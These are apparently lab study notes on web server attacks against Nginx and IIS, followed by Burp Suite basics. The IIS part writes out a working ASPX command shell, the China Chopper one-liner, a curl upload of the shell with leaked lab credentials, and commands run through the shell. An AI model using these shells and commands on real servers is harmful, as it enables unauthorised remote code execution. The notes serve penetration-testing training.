> [!summary] Quick Recap — Node.js Express
> 
> - `X-Powered-By: Express` is the primary fingerprint (no `Server` header set)
> - Custom error handlers can leak stack traces even with `NODE_ENV=production`
> - `/api/routes`-style debug endpoints dump the whole route table — version-sensitive (Express 4 vs 5)
> - `process.env` debug endpoints are critical findings (DB creds, API keys)
> - `express.static()` blocks dotfiles by default — 404 ≠ file doesn't exist

---

#### Nginx (Port 8080)

Same investigative template as Apache, different configuration vocabulary. Nginx is most often a reverse proxy, load balancer, or high-performance static file server — commonly the public-facing layer in front of an app server, which makes its config especially consequential.

> [!info] Port note Nginx runs on 8080 in this lab only because Apache already holds port 80. In real deployments, expect 80/443.

**Version disclosure** — controlled by `server_tokens` (Nginx's equivalent of Apache's `ServerTokens`), default `on`:

```shell-session
root@ip-10-81-64-63:~# curl -sI http://MACHINE_IP:8080 | grep -i server
Server: nginx/1.24.0 (Ubuntu)
```

`server_tokens` controls the version string in **both** the `Server` header _and_ default error pages simultaneously — `server_tokens off` suppresses both at once. If the header is missing, check a 404 page to confirm it's fully off rather than partially configured:

```shell-session
root@ip-10-81-64-63:~# curl -s http://MACHINE_IP:8080/nonexistent-path
<html>
<head><title>404 Not Found</title></head>
<body>
<center><h1>404 Not Found</h1></center>
<hr><center>nginx/1.24.0 (Ubuntu)</center>
</body>
</html>
```

**Directory listing via `autoindex`** — off by default, enabled deliberately in a location block:

```nginx
location /files/ {
    autoindex on;
    root /var/www/nginx/;
}
```

Legitimate for file-sharing setups; a misconfiguration when applied to sensitive paths without access control.

```shell-session
root@ip-10-81-64-63:~# curl -s http://MACHINE_IP:8080/files/
<html>
<head><title>Index of /files/</title></head>
<body>
<h1>Index of /files/</h1><hr><pre><a href="../">../</a>
<a href="deploy-notes.txt">deploy-notes.txt</a>   03-Apr-2026 18:23   148
<a href="old-backup.tar.gz">old-backup.tar.gz</a>  03-Apr-2026 18:23   236
<a href="server-config.txt">server-config.txt</a>  03-Apr-2026 18:23   135
</pre><hr></body>
</html>
```

**`/nginx_status` (`stub_status`)** — real-time connection metrics. Secure config restricts to localhost; misconfigured with `allow all`, open to anyone:

```nginx
location /nginx_status {
    stub_status;
    allow all;  # Should be: allow 127.0.0.1; deny all;
}
```

```shell-session
root@ip-10-81-64-63:~# curl -s http://MACHINE_IP:8080/nginx_status
Active connections: 1 
server accepts handled requests
 15 15 15 
Reading: 0 Writing: 1 Waiting: 0 
```

The unlabeled second line, in order: **total accepted connections, total handled connections, total requests** since server start. Third line: active connections broken down by state. Not directly exploitable, but leaks operational load/usage data and hints other monitoring endpoints may be similarly exposed.

> [!tip] Shell-access follow-up Nginx configs live in `/etc/nginx/` on Ubuntu. With shell access, `/etc/nginx/sites-available/` shows exactly what's exposed and what modules are enabled — no more guessing.

> [!summary] Quick Recap — Nginx
> 
> - `server_tokens` (default `on`) controls version in both `Server` header AND error pages
> - `autoindex on` in a location block = directory listing (off by default, unlike expectation)
> - `/nginx_status` (`stub_status`) leaks connection/request counts — check for `allow all` misconfig
> - Config lives in `/etc/nginx/sites-available/` if shell access is obtained

---

#### Common Misconfigurations Across Servers

**Security headers** — instruct the browser how to handle page content; protect against clickjacking, MIME sniffing, XSS. **None** of the four servers in this lab send these by default — that's the default state for all server types, not a lab-specific oversight.

|Header|Protects Against|Example Value|
|---|---|---|
|`X-Frame-Options`|Clickjacking (iframe embedding on another domain)|`DENY` or `SAMEORIGIN`|
|`X-Content-Type-Options`|MIME sniffing|`nosniff`|
|`Content-Security-Policy`|Restricts script/stylesheet/resource origins|`default-src 'self'`|
|`Referrer-Policy`|Controls `Referer` header on navigation|`no-referrer` or `strict-origin`|
|`Strict-Transport-Security`|Forces HTTPS on future requests (HTTPS-only)|`max-age=31536000`|

> [!note] X-Frame-Options vs CSP `X-Frame-Options` is technically superseded by `Content-Security-Policy: frame-ancestors`, which gives finer-grained control. Hardened modern sites may rely on CSP alone and intentionally omit `X-Frame-Options`. Check for **both** when writing findings.

Audit all ports in one pass:

```bash
for port in 80 8000 3000 8080; do
  echo "=== Port $port ==="
  curl -sI http://MACHINE_IP:$port/ | grep -iE "x-frame-options|x-content-type|content-security-policy|strict-transport|referrer-policy" || echo "(no security headers found)"
done
```

> [!note] HTTP vs HTTPS `Strict-Transport-Security` only applies over HTTPS. Its absence on an HTTP-only lab is expected, not an active misconfiguration.

**Automated scanning with Nikto** — checks known misconfigs, outdated software, exposed admin interfaces, missing security headers. Loud and easily detected — appropriate for authorised testing, not stealth.

```bash
nikto -h http://MACHINE_IP:80 -nointeractive
```

```
+ Server leaks inodes via ETags, header found with file /, fields: 0x29af 0x64e9243796aa2 
+ The anti-clickjacking X-Frame-Options header is not present.
+ OSVDB-561: /server-status: This reveals Apache information.
+ OSVDB-3268: /files/: Directory indexing found.
+ 6544 items checked: 0 error(s) and 6 item(s) reported on remote host
```

- `-nointeractive` — suppresses prompts, runs unattended
- Findings are lines starting with `+`

> [!tip] Faster Nikto scans `-Tuning` restricts which checks run. `nikto -h TARGET -Tuning 123` covers the most common findings without the full signature set. Tuning codes are **concatenated**, not comma-separated.

**Cross-server pattern summary:**

|Misconfiguration|Apache|Python HTTP|Node.js|Nginx|
|---|---|---|---|---|
|Version disclosure in headers|Yes|Yes|Partial|Yes|
|Directory listing|`/files/`|Root path|N/A|`/files/`|
|Exposed status/debug endpoint|`/server-status`|N/A|`/api/debug/env`, `/api/routes`|`/nginx_status`|
|Sensitive files accessible|`backup.bak`, notes|`.env`, `.zip`|`config.js`|`server-config.txt`, notes|
|Missing security headers|All|All|All|All|

**The takeaway:** default configs prioritise ease of deployment over security. Version disclosure, listings, and status pages exist by default for diagnostics — removing/restricting them takes deliberate action. Finding these on an engagement usually means defaults were never reviewed, not active negligence.

> [!summary] Quick Recap — Cross-Server Patterns
> 
> - No server sends security headers by default — audit all ports with one `curl` loop
> - `X-Frame-Options` alone isn't enough evidence of hardening — check for CSP `frame-ancestors` too
> - Nikto: loud, fast, good first pass; `-Tuning 123` for a quick scan, concatenated not comma-separated
> - Same four categories recur everywhere: version leak → directory listing → status/debug endpoint → forgotten sensitive files → no security headers

### Web Server Attacks — II

> [!info] Room context Continuation of Web Server Attacks — I, moving from Linux-based servers to **IIS on Windows Server**. IIS is tightly coupled with Windows auth, Active Directory, and the .NET runtime, making it a high-value initial access target. Full attack chain covered: fingerprinting → tilde enumeration → WebDAV shell upload → ASPX web shell mechanics → common misconfigurations → automation with Nmap NSE.

> [!note] Real-world precedent Lazarus Group exploited IIS servers in 2023 for initial access and malware distribution (AhnLab ASEC). HAFNIUM deployed ASPX web shells on IIS during the Exchange **ProxyLogon** campaign in 2021. CISA Advisory AA23-074A documented an APT group achieving RCE via a .NET deserialization flaw (**CVE-2019-18935**, Progress Telerik UI) hosted on IIS, dropping malicious DLLs through `w3wp.exe` for persistence.

#### IIS Fingerprinting and Enumeration

**Why version matters** — IIS version numbers map directly to Windows Server releases, and many CVEs are version-specific:

|IIS Version|Windows Server|Status|
|---|---|---|
|6.0|Server 2003|EOL (July 2015) — no post-EOL patches|
|7.0 / 7.5|Server 2008 / 2008 R2|EOL|
|8.0 / 8.5|Server 2012 / 2012 R2|EOL|
|10.0|Server 2016, 2019, 2022|Current|

> [!note] Version numbering IIS skipped `9.x` entirely — jumped straight from 8.5 to 10.0 with Server 2016. Lab target: IIS 10.0 on Server 2019.
> 
> **IIS/6.0 on a public IP = treat as compromised until proven otherwise.** No official Microsoft patch exists for CVE-2017-7269 (IIS 6.0-specific).

**Request flow (where vulnerabilities live):**

`HTTP.sys` (kernel-mode driver, receives all HTTP traffic first) → `W3SVC` → `WAS` → `w3wp.exe` (worker process) → application code.

- A vuln in `HTTP.sys` (e.g. **CVE-2022-21907**) runs in **kernel context** — a crash there is a Blue Screen of Death, not a graceful server error.
- **Application Pools** isolate each site into its own `w3wp.exe` under its own Windows identity — this is the account context an ASPX shell inherits. IIS 7.5+ defaults to `ApplicationPoolIdentity` (virtual account `IIS APPPOOL\<pool name>`). Both this and the older `NETWORK SERVICE` carry `SeImpersonatePrivilege` by default → opens the door to Potato-style escalation (see ASPX Web Shell section below).

**HTTP banner grabbing:**

```bash
curl -I http://MACHINE_IP
```

```
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
```

`Server` → IIS version. `X-Powered-By: ASP.NET` → confirms .NET hosting. `X-AspNet-Version` (if present) → .NET framework version, more CVEs to check.

**WebDAV detection via `OPTIONS`:**

WebDAV adds file-management verbs (`PUT`, `DELETE`, `COPY`, `MOVE`, `PROPFIND`, `LOCK`). Legitimate for SharePoint/web file editors — but a direct upload path if left on a directory with write + script-execute permissions.

```bash
curl -X OPTIONS http://MACHINE_IP -sv 2>&1 | grep -E "Allow:|DAV:"
```

- `Allow:` limited to `GET, HEAD, POST, OPTIONS` → WebDAV off
- `Allow:` includes `PUT, MOVE, PROPFIND...` + a `DAV: 1,2,3` header → WebDAV **on**, test for write access

**Testing upload + execution** — `PUT` a test file, then `GET` it:

```bash
curl -s -o /dev/null -w "PUT aspx: %{http_code}\n" -X PUT --data '<%@ Page Language=Jscript%><%Response.Write(1+1)%>' http://MACHINE_IP/webdav/test.aspx
```

`401` on the `PUT` → no write access (yet — see credential recovery below). A `200` on `GET` with **rendered output** (not raw source) confirms server-side execution vs. static file serving.

**Traffic patterns — normal vs suspicious:**

|Pattern|Normal|Suspicious|
|---|---|---|
|HTTP methods|`GET, POST, HEAD`|`OPTIONS` returning `DAV:`; `PUT, MOVE, PROPFIND`|
|URI paths|`.htm, .aspx, .js, .css`|Paths containing `~`; new `.aspx` in writable dirs|
|Status codes|`200, 304, 301, 302, 404`|`201 Created` (PUT succeeded); unexpected `PUT`/`DELETE` in logs|
|`Server` header|Present, expected version|Suppressed, or an EOL version like `IIS/6.0`|

> [!summary] Quick Recap — Fingerprinting & Enumeration
> 
> - IIS version → Windows Server release → applicable CVE range
> - `HTTP.sys` bugs = kernel-level (BSOD, not graceful errors)
> - App Pool identity = the account context any shell inherits (`ApplicationPoolIdentity` default carries `SeImpersonatePrivilege`)
> - `curl -X OPTIONS` + grep for `Allow:`/`DAV:` is the fast WebDAV check
> - `PUT` test file → `GET` it back: rendered output = executed, raw source = static

---

#### IIS Tilde (Short Filename) Enumeration

No exploit involved — this abuses a quirk built into Windows itself.

**The 8.3 short filename problem** — Windows generates legacy DOS-style 8.3 short names alongside long filenames on NTFS by default (some newer server builds disable this; **the lab target has it enabled**).

**Conversion rule:** first 6 characters of the long name + `~1` (or `~2`, `~3` on collision) + first 3 characters of the extension.

- `BackupFiles` → `BACKUP~1`
- `AdminPortal` → `ADMINI~1`
- `users_backup.xlsx` → `USERS_~1.XLS`

**How it leaks info:** a request containing `~` is processed against the 8.3 short-name namespace, and IIS responds _differently_ (status code or response size) depending on whether the tilde path matches a real short name. A scanner exploits that difference to reconstruct short names character by character.

> [!warning] Long-standing, unpatched Publicly disclosed in 2012 (discovered 2010). Affects **IIS 5.x through 10.0**, including current Server 2022 installs. Microsoft has declined to patch it — the only mitigation is disabling 8.3 filename creation in the registry.

**Scanning with `iis_shortname_scan.py`** (pure Python, no Java needed, lives at `/opt/IIS_shortname_Scanner` on the AttackBox):

```bash
cd /opt/IIS_shortname_Scanner
python3 iis_shortname_scan.py http://MACHINE_IP/
```

```
[+] /back~1.*    [scan in progress]
[+] Directory /backup~1    [Done]
----------------------------------------------------------------
Dir:  /aspnet~1
Dir:  /backup~1
----------------------------------------------------------------
2 Directories, 0 Files found in total
```

The tool works left to right: confirms single-character prefixes → extends letter by letter → drops non-matching branches → `[Done]` marks a fully resolved short name (no wildcard left). `*` = wildcard (zero or more characters).

**Interpreting a short name:**

|Short Name Discovered|Likely Full Name|Why It Matters|
|---|---|---|
|`BACKUP~1/`|`BackupFiles/`, `Backup_2024/`|Backup data, likely sensitive|
|`ADMINI~1/`|`AdminInterface/`, `Administration/`|Admin panel, restricted access|
|`CONFIG~1.ASP`|`configuration.asp`, `config_old.asp`|May contain credentials|
|`USERS_~1.XLS`|`users_backup.xlsx`|User data export, high value|

The short name alone doesn't resolve the resource directly (IIS doesn't serve content via the short-name path) — try likely full-name completions or a targeted wordlist against the confirmed prefix.

```shell-session
root@tryhackme:~# curl http://MACHINE_IP/BackupFiles/
...
<A HREF="/BackupFiles/webdav_notes.txt">webdav_notes.txt</A>
```

```shell-session
root@tryhackme:~# curl http://MACHINE_IP/BackupFiles/webdav_notes.txt
WebDAV setup notes
Directory: /webdav/
Username: [Username]
Password: [Password]
```

A developer left WebDAV credentials in an unlinked backup directory — invisible to a standard wordlist brute-force, surfaced entirely through the tilde quirk.

> [!summary] Quick Recap — Tilde Enumeration
> 
> - `~` in a URL path triggers the 8.3 short-name response difference
> - 8.3 format = first 6 chars of name + `~N` + first 3 chars of extension
> - Unpatched since 2010/2012 disclosure, affects IIS 5.x–10.0 — no official fix, only registry mitigation
> - `iis_shortname_scan.py` reconstructs short names character by character via response-difference probing
> - Surfaces resources a wordlist brute-force would never guess (unlinked backups, hidden admin paths)

---

#### WebDAV Exploitation: Uploading an ASPX Shell

Chain so far: unauthenticated `PUT` → `401` (Task 2) → tilde enum surfaced `BackupFiles/webdav_notes.txt` → credentials `webdav_user:P@ssw0rd!123` (Task 3). Now: use them.

**Three conditions that must all be true simultaneously:**

1. WebDAV enabled on the target directory
2. Valid credentials with **Write** permission on that WebDAV directory
3. **Script Execute** is set — IIS passes `.aspx` to the ASP.NET handler instead of serving it statically

If any one is missing, the attack fails at that step.

**The shell** (`cmd.aspx`) — accepts a `cmd` query parameter, runs it via `cmd.exe`, returns output:

```csharp
<%@ Page Language="C#" %>
<% 
  string cmd = Request.QueryString["cmd"];
  if (!string.IsNullOrEmpty(cmd)) {
    var proc = new System.Diagnostics.Process();
    proc.StartInfo.FileName = "cmd.exe";
    proc.StartInfo.Arguments = "/c " + cmd;
    proc.StartInfo.UseShellExecute = false;
    proc.StartInfo.RedirectStandardOutput = true;
    proc.Start();
    Response.Write("<pre>" + proc.StandardOutput.ReadToEnd() + "</pre>");
  }
%>
```

**Uploading with NTLM auth** — `/webdav/` is protected by Windows Authentication; anonymous users get `GET` only, write ops need a valid Windows identity. NTLM proves that identity without sending the plaintext password — curl's `--ntlm` flag drives the handshake:

```bash
curl -v --ntlm -u 'webdav_user:P@ssw0rd!123' -T cmd.aspx http://MACHINE_IP/webdav/cmd.aspx
```

`201 Created` in the response confirms the file was written.

**Confirming execution:**

```bash
curl "http://MACHINE_IP/webdav/cmd.aspx?cmd=whoami"
```

```
<pre>iis apppool\defaultapppool
</pre>
```

> [!warning] If you get a blank response or 500 The file uploaded fine, but **Script Execute** isn't set on `/webdav/` — IIS won't hand `.aspx` requests to the ASP.NET handler.

> [!summary] Quick Recap — WebDAV Shell Upload
> 
> - Needs all 3 simultaneously: WebDAV on, write-permitted creds, Script Execute enabled
> - `curl --ntlm -u user:pass -T file.aspx URL` uploads via NTLM-authenticated PUT
> - `201 Created` = upload succeeded; blank/500 on execution = Script Execute missing, not a failed upload

---

#### ASPX Web Shell — Mechanics, Escalation, and China Chopper

**What it is:** an `.aspx` file that accepts attacker input over HTTP and executes it under the server process. To IIS it's just another page; to the attacker it's a remote command interface. The ASP.NET handler compiles/runs the code inside `w3wp.exe`, under the **Application Pool identity** — whatever Windows account that pool is configured to run as. An app pool running as `ApplicationPoolIdentity` gives limited access (but inherits `SeImpersonatePrivilege`); one running as `SYSTEM` or Domain Admin hands the shell instant high privilege.

**Step 1 — command execution through the shell:**

```bash
curl "http://MACHINE_IP/webdav/cmd.aspx?cmd=whoami"
# <pre>iis apppool\defaultapppool</pre>
```

```bash
curl "http://MACHINE_IP/webdav/cmd.aspx?cmd=hostname"
curl "http://MACHINE_IP/webdav/cmd.aspx?cmd=ipconfig"
curl "http://MACHINE_IP/webdav/cmd.aspx?cmd=dir+C:\\"
```

> [!note] Encoding URL-encode spaces in `cmd` as `+` or `%20`. Special characters may render oddly, but the commands still execute correctly.

**Step 2 — escalate to an interactive reverse shell:**

Start a listener (port 443 preferred — outbound HTTPS is almost never firewalled, unlike 4444):

```bash
nc -lvnp 443
```

PowerShell one-liner (flags: `-NoP` skip profile, `-NonI` non-interactive, `-W Hidden` hide window, `-Exec Bypass` override `Restricted` execution policy), URL-encoded and passed as the `cmd` parameter — connects back to `{CONNECTION_IP}:443`.

**Step 3 — confirm privileges once connected:**

```
PS C:\windows\system32\inetsrv> whoami /priv

Privilege Name                Description                               State
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
```

> [!warning] SeImpersonatePrivilege — the key escalation path Lets a process impersonate any user who connects to it at the Windows token level. This is what **PrintSpoofer**, **JuicyPotato**, and **GodPotato** abuse: force a SYSTEM-level process to authenticate to an attacker-controlled named pipe, then steal the SYSTEM token via impersonation. It's the standard escalation route from any network-service identity (like `iis apppool\defaultapppool`) to `SYSTEM`. Escalation itself is out of scope here — the point is recognising the predictable starting privilege and its well-documented follow-on path.

**China Chopper** — what real-world ASPX shells actually look like. First documented 2012; HAFNIUM used variants extensively during Exchange ProxyLogon (2021) (MITRE ATT&CK T1505.003). Its whole appeal is size — the server-side component is **73 bytes**:

```csharp
<%@ Page Language="Jscript"%><%eval(Request.Item["chopper"],"unsafe");%>
```

A separate client-side tool sends encoded commands via POST to the `chopper` parameter — encoding makes it harder to catch via simple request-body inspection.

> [!tip] Defender signal Hunt for ASPX files containing `eval(` or `execute(` patterns, especially in directories that shouldn't hold user-created files. The 73-byte file size and the `eval(` string are the two things AV/EDR signatures commonly key on.

> [!summary] Quick Recap — ASPX Shells
> 
> - Shell code runs inside `w3wp.exe` under the App Pool identity — that identity IS the shell's privilege ceiling
> - `SeImpersonatePrivilege` (default on `ApplicationPoolIdentity`/`NETWORK SERVICE`) → Potato-tool escalation path to SYSTEM
> - Port 443 for reverse shell callbacks — blends with normal outbound HTTPS
> - China Chopper = 73-byte `eval()`-based shell, still in active use by real threat actors since 2012

---

#### IIS Misconfigurations (No CVE Required)

A different category from the WebDAV chain above — these are wrong-by-default or easy-to-accidentally-enable settings, each a standalone finding.

**1. Directory listing enabled** — no default document + `Directory Browsing` on in IIS Manager → file listing instead of `403`.

```bash
curl http://MACHINE_IP/uploads/
# config.bak, web.config visible and downloadable
```

Watch for: `.bak`, `.config`, `.log`, `.zip`, `.sql`.

**2. `PUT`/`DELETE` without authentication** — same `OPTIONS` check as before:

```bash
curl -X OPTIONS http://MACHINE_IP/ -sv 2>&1 | grep "Allow:"
```

If `PUT`/`DELETE` appear with no auth requirement, unauthenticated upload is possible — and WebDAV isn't always scoped to one directory; some admins enable it globally, making the **entire site** writable.

**3. `web.config` exposure** — the ASP.NET config file: DB connection strings, API keys, SMTP creds, encryption keys. IIS normally 404s `.config` requests via a filtering rule/handler mapping; if removed or misconfigured:

```bash
curl http://MACHINE_IP/web.config
```

`200` + XML starting `<configuration>` = high-severity finding (connection strings alone often hold DB credentials).

**4. Verbose error messages** — dev-mode IIS returns full .NET stack traces: internal file paths, framework version, failed query, sometimes internal IPs.

```xml
<system.web>
  <customErrors mode="On" />
</system.web>
```

> [!note] `customErrors` states ASP.NET default is `RemoteOnly` — protects remote callers, still exposes traces to localhost. Only `mode="Off"` sends stack traces to **external** clients; `customErrors` simply absent from `web.config` isn't necessarily as exposed as it looks on a remote pentest.

**5. `trace.axd` left enabled** — ASP.NET's built-in diagnostic handler; shows the trace log for recent requests (headers, form values, session state, cookies, timing — default `requestLimit="50"`, window closes fast on active servers).

```bash
curl http://MACHINE_IP/trace.axd
```

`200` = accessible = finding. Fix: `<trace enabled="false"/>` in `web.config`. Beyond info disclosure — **session cookies and auth tokens in the trace log can be replayed directly.**

**6. `TRACE` method enabled** — different from `trace.axd`. HTTP `TRACE` echoes the request back; diagnostic-only, no legit production use, enables **Cross-Site Tracing (XST)**.

```bash
curl -X TRACE http://MACHINE_IP -sv
```

`200` + echoed request body = live (should be `405 Method Not Allowed`).

> [!note] Real-world severity caveat Modern browsers block `TRACE` in `XMLHttpRequest`, closing the browser-based XST vector in practice. Still worth reporting as configuration hygiene — but note the primary attack path needs an outdated browser or a non-browser HTTP client.

**7. Application Pool running as a privileged account** — default `ApplicationPoolIdentity` is low-privilege, but admins sometimes set the pool to run as `SYSTEM`, `Administrator`, or a domain admin (often to dodge file-share/DB permission errors).

```bash
curl "http://MACHINE_IP/webdav/cmd.aspx?cmd=whoami"
```

`nt authority\system` or a domain admin username instead of `iis apppool\defaultapppool` → immediate elevated access, no further escalation needed.

> [!summary] Quick Recap — Misconfigurations
> 
> - Directory listing → check for `.bak`, `.config`, `.log`, `.zip`, `.sql`
> - `web.config` reachable → `200` + `<configuration>` = credentials likely exposed
> - `trace.axd` reachable → session cookies/tokens replayable directly, not just info disclosure
> - `TRACE` enabled → real but browser-mitigated in practice; still report it
> - App Pool identity = `whoami` via any shell — SYSTEM/domain admin here means game over immediately

---

#### Automation with Nmap NSE

Everything done manually above, condensed into scripted scans — same findings, seconds instead of separate curl commands.

|Script|What It Does|
|---|---|
|`http-methods`|`OPTIONS` request, parses `Allow:` for permitted methods|
|`http-webdav-scan`|Probes WebDAV support, retrieves `DAV` headers|
|`http-iis-webdav-vuln`|Tests IIS WebDAV auth bypass (**CVE-2009-1535**, IIS 5/6)|
|`http-ntlm-info`|Sends NTLM auth request, extracts target info from the challenge response|

All included in a standard Nmap install — no extra plugins.

**Version detection first:**

```bash
nmap -sV -p 80 MACHINE_IP
# 80/tcp open  http    Microsoft IIS httpd 10.0
```

**HTTP methods:**

```bash
nmap --script http-methods -p 80 MACHINE_IP
```

```
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
|_  Potentially risky methods: TRACE COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
```

Root path already exposing WebDAV verbs = WebDAV enabled **globally**, not just on `/webdav/` — a misconfiguration in itself.

**WebDAV detection:**

```bash
nmap --script http-webdav-scan -p 80 MACHINE_IP
```

```
|   Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
|   WebDAV type: Unknown
|_  Server Type: Microsoft-IIS/10.0
```

> [!note] "WebDAV type: Unknown" isn't a dead end The verb list (`PROPFIND`, `PROPPATCH`, `MKCOL`, `COPY`, `MOVE`, `LOCK`, `UNLOCK`) isn't standard HTTP — their presence alone confirms WebDAV regardless of the "Unknown" type label, which is just an Nmap fingerprinting-version limitation.

**Authentication/target info via NTLM:**

```bash
nmap --script http-ntlm-info --script-args http-ntlm-info.root=/webdav/ -p 80 MACHINE_IP
```

```
|   Target_Name: CHANGE-MY-HOSTN
|   NetBIOS_Computer_Name: CHANGE-MY-HOSTN
|_  Product_Version: 10.0.17763
```

`Product_Version: 10.0.17763` confirms Windows Server 2019; hostname is exposed too — all from **one unauthenticated probe**.

> [!summary] Quick Recap — Automation
> 
> - `nmap -sV` first to confirm IIS version, then target scripts based on that range
> - `http-methods` = scripted `OPTIONS` check; risky methods flagged automatically
> - `http-webdav-scan` verb list confirms WebDAV even when "type" fingerprinting fails
> - `http-ntlm-info` leaks OS build + hostname unauthenticated — always worth a probe against any WebDAV/NTLM-protected path

---

> [!summary] Full IIS Chain — One Glance
> 
> - Fingerprint (`Server`/`X-Powered-By` headers) → version tells you CVE range and EOL status
> - Tilde enum (`~` + 8.3 short names) → finds unlinked backups/creds no wordlist would catch
> - WebDAV + leaked creds + Script Execute → `curl --ntlm -T shell.aspx` → `201 Created`
> - ASPX shell runs as App Pool identity → check `whoami` → `SeImpersonatePrivilege` = Potato-tool path to SYSTEM
> - Misconfigs need no exploit: directory listing, `web.config`, `trace.axd`, `TRACE` method, over-privileged App Pool
> - Nmap NSE (`http-methods`, `http-webdav-scan`, `http-ntlm-info`) automates the whole manual recon chain

## 7. Burp Suite

> [!info] How to use this section Five rooms, covering Burp Suite from setup through automation: **Basics → Repeater → Intruder → Other Modules → Extensions**. Written from general Burp Suite/PortSwigger knowledge rather than transcribed from a specific room, since no source text was provided this time — treat the mechanics and workflows as solid, but if a specific room's wording, exact menu labels, or flag/question phrasing differs, adjust against the live room as you go through it.

### Burp Suite: The Basics

**What Burp Suite is:** an intercepting proxy and web application testing toolkit. It sits between your browser and the target server, letting you see, pause, and modify every HTTP/S request and response passing through. Everything else in the suite (Repeater, Intruder, Scanner, extensions) is built on top of that core proxy capability.

**Community vs Professional:**

|Feature|Community (Free)|Professional (Paid)|
|---|---|---|
|Proxy, Repeater, Intruder|Full|Full|
|Intruder speed|Heavily rate-limited|Full speed|
|Burp Scanner (automated)|Not included|Included|
|Extensions (BApp Store)|Available|Available|
|Project save/resume|No|Yes|

Most CTF/lab work is done on Community — Intruder just runs slower.

**Setting up the intercepting proxy:**

1. Burp listens on `127.0.0.1:8080` by default (**Proxy → Proxy settings → Proxy listeners**)
2. Point your browser at that proxy — either manually in browser network settings, or via **FoxyProxy** (recommended: a one-click toggle extension rather than editing OS/browser proxy settings every time)
3. Install Burp's CA certificate to intercept **HTTPS** traffic without constant browser warnings: visit `http://burp` (or `http://burpsuite`) while proxying through Burp, download the CA cert, import it into your browser's trusted certificate authorities

> [!warning] Without the CA cert HTTPS sites will throw certificate warnings on every request, because Burp is presenting its own generated cert to terminate TLS and re-encrypt to the real server (a deliberate MITM position). Installing the cert as trusted is what makes this seamless.

**Intercept on/off:**

- **Proxy → Intercept** tab, toggle **Intercept is on/off**
- When **on**, every request pauses in Burp before reaching the server — you can **Forward**, **Drop**, or edit it first
- When **off**, traffic flows through transparently but is still logged to **HTTP history**

**HTTP History** — every request/response that has passed through the proxy, whether intercept was on or off. This is often more useful than live intercepting: browse the target normally with intercept off, then go back through history to find the interesting requests (login, search, file upload, API calls) and send them onward to Repeater/Intruder.

**Sending requests to other tools:** right-click any request in **Proxy → HTTP history** (or while it's paused in Intercept) → **Send to Repeater** / **Send to Intruder** / **Send to Comparer**, etc. This is the core Burp workflow: capture once, replay and modify as many times as needed elsewhere.

**The request/response editor** — appears throughout Burp (Proxy, Repeater, etc.):

- **Pretty** — formatted/syntax-highlighted view
- **Raw** — exact bytes, what actually goes over the wire
- **Hex** — for binary payloads

**Target → Site map** — builds a tree of every host/path Burp has seen, useful for getting a structural overview of an application as you browse it.

**Scope** — **Target → Scope**, define which hosts/paths are "in scope" for the current engagement. Setting scope lets you filter noise (analytics, CDNs, unrelated domains) out of HTTP history and site map, and restricts what Burp's automated tools will touch — important both for staying within ROE (rules of engagement) on real engagements and for keeping lab output readable.

> [!summary] Quick Recap — Burp Suite Basics
> 
> - Burp = intercepting proxy at `127.0.0.1:8080` sitting between browser and target
> - Install Burp's CA cert (`http://burp`) to avoid HTTPS warnings — Burp MITMs TLS deliberately
> - **Intercept** pauses traffic live; **HTTP history** logs everything regardless of intercept state
> - Right-click → **Send to [Tool]** is the core workflow: capture once in Proxy, act on it elsewhere
> - **Scope** (Target → Scope) filters noise and restricts automated tools to in-scope hosts
> - Community edition = full Repeater/Intruder, just rate-limited Intruder and no Scanner/project-save

---

### Burp Suite: Repeater

**What Repeater is for:** taking a single captured request and manually resending it, again and again, with edits between each send. This is the workhorse for manual testing — probing parameters, testing auth bypasses, checking IDOR, tweaking payloads one field at a time and watching how the response changes.

**Sending a request to Repeater:** right-click in Proxy/HTTP history → **Send to Repeater**, or `Ctrl+R` on a selected request. Opens (or adds a new tab) in the **Repeater** panel.

**The Repeater workflow:**

1. Request loads in the left-hand editor pane (Pretty/Raw/Hex, same as Proxy)
2. Edit any part of it — headers, method, body, parameters, cookies
3. Click **Send** (or `Ctrl+Enter`)
4. Response appears in the right-hand pane
5. Edit again, send again — each send is independent, previous responses aren't overwritten unless you want them to be

**Tabs and organisation:** each request sent to Repeater opens its own tab (or you can group related requests). Useful for holding several test cases side by side — e.g. one tab with the original login request, one with a modified `role` parameter, one with an SQLi payload in the username field — so you can flip between them and compare responses without losing your place.

**Practical use cases:**

- **Parameter tampering** — change a hidden form field, an ID in the URL, a `role` or `isAdmin` value, and observe whether the server trusts client-supplied data
- **IDOR testing** — increment/decrement an ID in a request that fetches "your" resource, see if another user's data comes back
- **Auth/session testing** — strip or swap cookies/tokens, see what the server allows without them
- **Payload iteration** — for SQLi, XSS, command injection: drop a payload in a field, read the response, adjust, resend — much faster than doing this through the browser UI each time
- **Response diffing by eye** — since each send's response is retained per-tab, you can compare status code, length, and body content across variants of the same request

**Reading the response pane carefully matters more here than anywhere else in Burp** — status code, response length (shown in the tab/history), timing, and body content are all signal. A `200` with a slightly different response length between two otherwise-identical requests is often the first clue something is different server-side (this same instinct is what powers Intruder's grep/length-based filtering, covered next).

> [!tip] Keyboard efficiency `Ctrl+R` to send to Repeater, `Ctrl+Enter` to send from within Repeater, `Ctrl+Shift+Tab`/`Ctrl+Tab` to move between tabs. Manual testing in Repeater is a high-repetition workflow — the keyboard shortcuts pay for themselves quickly.

> [!summary] Quick Recap — Repeater
> 
> - Repeater = manual, iterative single-request testing; edit → send → read response → repeat
> - Each tab holds its own request/response history — good for comparing variants side by side
> - Core use cases: parameter tampering, IDOR, auth/session bypass testing, payload iteration
> - Response length/status/timing differences between near-identical requests are the main signal to watch for
> - Not for bulk/automated testing — that's Intruder's job

---

### Burp Suite: Intruder

**What Intruder is for:** automated, repeated sending of a single request template with varying payloads inserted at marked positions — brute-forcing, fuzzing, and systematic parameter testing at scale, where Repeater would be too slow to do by hand.

**Sending to Intruder:** right-click a captured request → **Send to Intruder** (or `Ctrl+I`).

